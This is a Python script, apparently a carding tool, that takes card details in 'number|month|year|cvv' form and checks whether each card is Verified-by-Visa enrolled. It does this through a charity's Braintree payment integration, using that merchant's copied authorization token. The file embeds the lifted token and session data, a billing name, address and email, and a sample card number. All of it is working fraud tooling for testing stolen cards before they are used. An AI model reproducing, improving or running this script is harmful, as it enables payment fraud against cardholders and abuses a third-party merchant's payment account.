# braintree vbv lookup
# improved version combining vbv.py and vvv.py
import requests

def check_vbv(cc):
    try:
        # Parse the card details
        card = cc.split('|')
        cc_num = card[0]
        mes = card[1]
        ano = card[2]
        cvv = card[3]
        bin_num = cc_num[:6]

        # Token request headers (updated from vvv.py)
        token_headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDQyNTgxMzcsImp0aSI6IjM1MGY0MTk2LTliZTktNDJkMC05NGViLWU4MmJkZjQxYmM2YiIsInN1YiI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.U1xdZMc0jx-RxUXD4J0tp5l03xCbRiuGAJLMGu8RBTuWG48e2VSzXMx64puYlbWm3EPcNTAhAcUocpPexcXC5g',
            'Braintree-Version': '2018-05-10',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://assets.braintreegateway.com',
            'Referer': 'https://assets.braintreegateway.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        # Token request payload (updated with better structure)
        token_json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'dropin2',
                'sessionId': '7b6e756d-8da4-4db2-865c-7006cc14b135',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc_num,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                        'cardholderName': 'luckg kumR',
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        # Make token request
        token_response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=token_headers,
            json=token_json_data
        )
        token_response.raise_for_status()
        token_data = token_response.json()
        
        if 'data' not in token_data or 'tokenizeCreditCard' not in token_data['data']:
            return f"{cc}|Error: Tokenization failed - {token_data.get('errors', 'No error details')}"
            
        token = token_data['data']['tokenizeCreditCard']['token']

        # Lookup headers (updated from vvv.py)
        lookup_headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://literacytrust.org.uk',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        # Lookup payload (updated with newer SDK version from vvv.py)
        lookup_json_data = {
            'amount': 1,
            'additionalInfo': {
                'acsWindowSize': '03',
                'billingLine1': '5805 Chantry Dr',
                'billingLine2': '',
                'billingPostalCode': '43232',
                'billingCountryCode': 'US',
                'billingGivenName': 'saimon',
                'billingSurname': 'dives',
                'email': 'saimondives@gmail.com',
            },
            'bin': bin_num,
            'dfReferenceId': '0_5c6c413a-e7b7-4a01-ab2b-64f42e2febb4',
            'clientMetadata': {
                'requestedThreeDSecureVersion': '2',
                'sdkVersion': 'web/3.99.0',
                'cardinalDeviceDataCollectionTimeElapsed': 52,
                'issuerDeviceDataCollectionTimeElapsed': 3804,
                'issuerDeviceDataCollectionResult': True,
            },
            'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDQyNTgxMzcsImp0aSI6IjM1MGY0MTk2LTliZTktNDJkMC05NGViLWU4MmJkZjQxYmM2YiIsInN1YiI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.U1xdZMc0jx-RxUXD4J0tp5l03xCbRiuGAJLMGu8RBTuWG48e2VSzXMx64puYlbWm3EPcNTAhAcUocpPexcXC5g',
            'braintreeLibraryVersion': 'braintree/web/3.99.0',
            '_meta': {
                'merchantAppId': 'literacytrust.org.uk',
                'platform': 'web',
                'sdkVersion': '3.99.0',
                'source': 'client',
                'integration': 'custom',
                'integrationType': 'custom',
                'sessionId': '7b6e756d-8da4-4db2-865c-7006cc14b135',
            },
        }

        # Make lookup request
        lookup_response = requests.post(
            f'https://api.braintreegateway.com/merchants/458w85bw8sbvhtfc/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
            headers=lookup_headers,
            json=lookup_json_data,
        )
        lookup_response.raise_for_status()
        lookup_data = lookup_response.json()
        
        if 'paymentMethod' in lookup_data and 'threeDSecureInfo' in lookup_data['paymentMethod']:
            status = lookup_data['paymentMethod']['threeDSecureInfo']['status']
            return f"{cc}|VBV Status: {status}"
        else:
            return f"{cc}|VBV lookup failed - {lookup_data.get('message', 'No status found')}"
            
    except Exception as e:
        return f"{cc}|Error: {str(e)}"

# Example usage
if __name__ == "__main__":
    # Test with sample card
    cc = "4830103021643473|9|26|164"
    result = check_vbv(cc)
    print(result)